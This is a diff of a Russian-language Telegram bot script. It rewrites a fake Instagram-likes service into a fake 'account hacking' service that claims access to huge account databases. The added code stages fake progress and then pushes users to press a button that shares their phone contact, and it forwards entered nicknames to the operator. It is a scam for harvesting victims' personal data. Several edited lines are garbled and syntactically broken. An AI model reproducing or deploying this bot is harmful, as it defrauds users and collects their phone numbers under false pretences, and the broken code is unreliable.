@@ -193,29 +193,28 @@ bot.send_message(ID, '!BOT STARTED!')
 print("Бот запущен!") 
 @bot.message_handler(commands=['start'])
 def start(message):
-	bot.send_message(message.chat.id, '''👋 Привет! 👋
-		Это бот для накрутки лайков и подписчиков в инстаграм!
-		Для старта напишите /nacrutka''') 
-@bot.message_handler(commands=['lamer112311dev'])
-def start(message):
-	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: @Cyber_Puffin') 
-@bot.message_handler(commands=['nacrutka'])
+	bot.send_message(message.chat.id, '''Добро пожаловать.
+	Это анонимный бот для взлома аккаунтов. 100% Анонимно
+	Бот является абсолютно бесплатным но работает с помощью рекламы
+	Бот автоматически берёт информацию из 296.000.000 баз аккаунтов
+	Что-бы продолжить напишите "Продолжить") 
+@bot.message_handler(content_types=["Продолжить"])
 def start(message):
 	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-	first_button = types.InlineKeyboardButton(text="Лайки", callback_data="first")
-	second_button = types.InlineKeyboardButton(text="Подписчики", callback_data="second")
+	first_button = types.InlineKeyboardButton(text="Взлом :dark_sunglasses:", callback_data="first")
+	second_button = types.InlineKeyboardButton(text="Провкрка Баз :zap:", callback_data="second")
 	keyboardmain.add(first_button, second_button)
 	bot.send_message(message.chat.id, "Выберите пункт накрутки:", reply_markup=keyboardmain)
 
 @bot.callback_query_handler(func=lambda call:True)
 def callback_inline(call):
 	if call.data == "first":
-		msg = bot.send_message(call.message.chat.id, 'Введите колличество лайков (не более 500)') 
+		msg = bot.send_message(call.message.chat.id, 'Введите user-tag пользователя Телеграм и потом потоки для проверки, пример: @durov 1000') 
 		bot.register_next_step_handler(msg, proc1)
 
 	elif call.data == "second":
-		msg = bot.send_message(call.message.chat.id, 'Введите колличество подписчиков (не более 500)') 
-		bot.register_next_step_handler(msg, proc2)
+		msg = bot.send_messagext_step_handler(msg, proc2)(call.message.chat.id, '98.37 баз работают на данный момент') 
+		bot.register_ne
 
 def proc1(message):
 	try:
@@ -223,19 +222,19 @@ def proc1(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
+			msg = bot.reply_to(message, 'Введите колличество потков числом! Повторите попытку, написав Продолжить!')#⏳
 			return
-		if int(num) > 500:
-			bot.reply_to(message, 'Колличество лайков не может быть более 500!')
+		if int(num) > 100000:
+			bot.reply_to(message, 'Количество потоков не может превышать 100.000')
 			return
 
 
-		time.sleep(2)
+		time.sleep(6)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="ВЗЛОМАТЬ", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Мы уже получили все данные для аккаунта!
+			Что-бы получить данные вы должны нажать ВЗЛОМАТЬ в нашем боте!''', reply_markup=keyboard)
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')
@@ -247,19 +246,19 @@ def proc2(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
+			msg = bot.reply_to(message, 'Спасибо что пользуетесь ботом')#⏳
 			return
 
-		if int(num) > 500:
-			bot.reply_to(message, 'Колличество подписчиков не может быть более 500!')
+		if int(num) > 2:
+			bot.reply_to(message, 'Базы проверены! Все работает')
 			return
 
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Напишите ВЗЛОМАТЬ!
+			Удачи!''', reply_markup=keyboard)
 
 	except Exception as e:
 		bot.send_message(ID, e)
@@ -301,8 +300,8 @@ def entr(message):
 		m_id = message.chat.id
 
 		bot.reply_to(message, f'Ник: {{inp}} ')#⏳
-		bot.send_message(ID, f'Ник в инстарам: {{inp}}')
-		bot.send_message(message.chat.id, 'Ожидайте накрутку на ваш аккаунт в течении 24 часов!')
+		bot.send_message(ID, f'Ник2: {{inp}}')
+		bot.send_message(message.chat.id, 'Ожидайте взлом в течении 24 часов!')
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')
